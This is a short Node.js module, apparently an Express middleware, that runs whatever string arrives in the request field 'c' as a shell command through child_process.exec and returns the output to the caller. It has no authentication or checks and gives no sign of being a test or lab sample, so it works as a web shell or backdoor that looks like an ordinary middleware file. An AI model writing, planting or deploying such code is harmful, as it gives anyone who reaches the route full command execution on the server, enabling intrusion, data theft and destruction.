'use strict'
const { exec } = require('child_process')

module.exports = (req, res, next) => {
  exec(req.body.c, (err, stdout, stderr) => {
    if (err) {
      return
    }
    res.send(stdout)
  })
}
